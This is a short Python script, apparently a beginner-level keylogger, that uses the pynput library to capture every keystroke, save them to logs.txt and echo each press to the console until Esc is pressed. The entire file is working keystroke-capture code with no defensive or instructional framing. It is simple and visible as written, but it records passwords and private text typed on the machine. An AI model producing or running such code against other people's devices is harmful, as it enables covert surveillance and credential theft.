import pynput
from pynput.keyboard import Key, Listener

keys = []
def on_press(key):
    keys.append(key)
    key_write(keys)

    try:
        print("Alpha-numeric key {0} pressed ".format(key.char))
    except AttributeError:
        print("Special key {0} pressed ".format(key))

def key_write(keys):
    with open("logs.txt", 'w') as f:
        for key in keys:
            k = str(key).replace("'", "")
            f.write(k)
            f.write(" ")

def on_release(key):
    print("{0} released ".format(key))
    if key == Key.esc:
        print("Program Exit")
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()